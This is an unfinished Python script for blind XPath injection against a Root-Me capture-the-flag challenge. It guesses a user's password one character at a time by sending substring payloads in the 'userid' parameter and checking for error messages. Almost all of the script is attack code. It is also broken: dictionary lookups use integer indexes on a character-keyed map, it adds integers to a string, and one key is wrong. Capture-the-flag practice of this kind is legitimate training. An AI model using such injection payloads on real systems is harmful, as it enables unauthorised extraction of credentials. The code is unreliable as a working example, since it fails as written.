# UNFINISH

import requests

url = 'http://challenge01.root-me.org/web-serveur/ch24/'

# element user(userid, username, password, email, account) -> check string-length element name, /* : all element
# pass_length = 0
# for i in range(3,20):
# 	payload = "2 and string-length(//user[2]/password/text())=%d" %i
# 	params = {'action':'user','userid':payload}
# 	r = requests.get(url, params=params)
# 	if 'XPath error' not in r.text:
# 		pass_length = i
# 		print("[+] - Password has %d characters!" %i)
# 		break
pass_length = 13

# Lập charset bởi slash bị blocked

charset = { # Mọi nguồn lực, thêm cả ký tự hoa
	'a':'//user[2]/account,1', 'b':'//user[1]/account,3', 'c':'//user[1]/account,5', 
	'd':'//user[2]/account,2', 'e':'//user[1]/account,9',
	'f':'', 'g':'//user[2]/email,12', 'h':'//user[2]/email,3', 'i':'//user[3]/email,2', 
	'k':'', 'l':'//user[5]/email,2', 'm':'//user[1]/email,9',
	'n':'//user[2]/username,4', 'o':'//user[2]/username,2', 'p':'', 'q':'', 
	'r':'//user[4]/username,3', 's':'//user[5]/username,4', 't':'//user[5]/email,7',
	'u':'//user[1]/account,2', 'v':'', 'w':'', 'x':'', 'y':'//user[4]/username,5', 
	'z':'//user[2]/email,11', '0':'string(0),1', '1':'string(1),1',
	'2':'string(2),1', '3':'string(3),1', '4':'string(4),1', '5':'string(5),1',
	'6':'string(6),1', '7':'string(7),1', '':'string(8),1', '9':'string(9),1',
	'@':'//user[3]/email,4',  '.':'//user[3]/email,8',

}

# for i in charset:
# 	print(i+' : '+'subtring(%s,1)' %charset.get(i))


password = ''
for i in range(1,pass_length+1):
	print('[-]-Finding at: %s' %i)
	for j in range(1, len(charset)):
		payload = "2 and substring(//user[2]/password/text(),%d, 1)=substring(%s,1)" %(i, charset.get(j))
		params = {'action':'user','userid':payload}
		r = requests.get(url, params=params)
		if 'XPath error' not in r.text:
			password += j
			print("[+] -> Password is: %s" %password)
			break
		if j==pass_length:
			password += '_'
			print("[+] -> Password is: %s" %password)